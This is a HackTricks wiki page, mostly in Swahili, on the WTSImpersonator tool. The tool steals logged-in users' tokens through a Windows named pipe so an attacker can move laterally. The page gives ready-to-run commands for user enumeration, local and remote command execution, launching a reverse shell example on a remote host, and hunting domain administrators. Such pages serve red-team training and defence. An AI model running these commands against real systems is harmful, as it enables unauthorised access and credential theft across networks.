{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

Chombo cha **WTS Impersonator** kinatumia **"\\pipe\LSM_API_service"** RPC Named pipe ili kuhesabu kwa siri watumiaji walioingia na kuiba token zao, ikiepuka mbinu za jadi za Token Impersonation. Njia hii inarahisisha harakati za upande kwa urahisi ndani ya mitandao. Ubunifu wa mbinu hii unahusishwa na **Omri Baso, ambaye kazi yake inapatikana kwenye [GitHub](https://github.com/OmriBaso/WTSImpersonator)**.

### Msingi wa Kazi
Chombo kinatumika kupitia mfululizo wa API calls:
```powershell
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
### Key Modules and Usage
- **Enumerating Users**: Uteuzi wa watumiaji wa ndani na mbali unapatikana kwa zana, kwa kutumia amri kwa kila hali:
- Locally:
```powershell
.\WTSImpersonator.exe -m enum
```
- Remotely, by specifying an IP address or hostname:
```powershell
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **Executing Commands**: Moduli za `exec` na `exec-remote` zinahitaji muktadha wa **Huduma** ili kufanya kazi. Utekelezaji wa ndani unahitaji tu executable ya WTSImpersonator na amri:
- Mfano wa utekelezaji wa amri za ndani:
```powershell
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- PsExec64.exe inaweza kutumika kupata muktadha wa huduma:
```powershell
.\PsExec64.exe -accepteula -s cmd.exe
```

- **Remote Command Execution**: Inahusisha kuunda na kufunga huduma kwa mbali kama PsExec.exe, ikiruhusu utekelezaji kwa ruhusa zinazofaa.
- Mfano wa utekelezaji wa mbali:
```powershell
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **User Hunting Module**: Inalenga watumiaji maalum kwenye mashine nyingi, ikitekeleza msimbo chini ya ithibati zao. Hii ni muhimu hasa kwa kulenga Wasimamizi wa Kikoa wenye haki za usimamizi wa ndani kwenye mifumo kadhaa.
- Mfano wa matumizi:
```powershell
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```


{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
